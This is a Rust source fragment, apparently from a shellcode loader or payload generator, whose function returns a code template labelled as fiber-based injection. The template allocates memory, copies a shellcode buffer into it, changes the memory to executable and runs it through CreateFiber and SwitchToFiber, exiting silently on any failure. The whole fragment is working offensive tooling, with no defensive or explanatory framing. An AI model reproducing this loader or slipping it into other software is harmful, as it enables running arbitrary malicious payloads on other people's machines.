pub fn fiber_snippet() -> String {
    r#"    // Injection: Fiber-based local execution
    {
        use windows_sys::Win32::System::Memory::*;
        use windows_sys::Win32::System::Threading::*;
        use std::ffi::c_void;

        let main_fiber = unsafe { ConvertThreadToFiber(std::ptr::null()) };
        if main_fiber.is_null() { std::process::exit(0); }

        let addr = unsafe {
            VirtualAlloc(
                std::ptr::null(),
                shellcode.len(),
                MEM_COMMIT | MEM_RESERVE,
                PAGE_READWRITE,
            )
        };
        if addr.is_null() { std::process::exit(0); }

        unsafe {
            std::ptr::copy_nonoverlapping(
                shellcode.as_ptr(),
                addr as *mut u8,
                shellcode.len(),
            );
        }

        let mut old_protect = 0u32;
        unsafe {
            VirtualProtect(
                addr,
                shellcode.len(),
                PAGE_EXECUTE_READ,
                &mut old_protect,
            );
        }

        let shellcode_fiber = unsafe {
            CreateFiber(
                0,
                Some(std::mem::transmute(addr)),
                std::ptr::null(),
            )
        };
        if shellcode_fiber.is_null() { std::process::exit(0); }

        unsafe { SwitchToFiber(shellcode_fiber); }
    }"#
    .to_string()
}
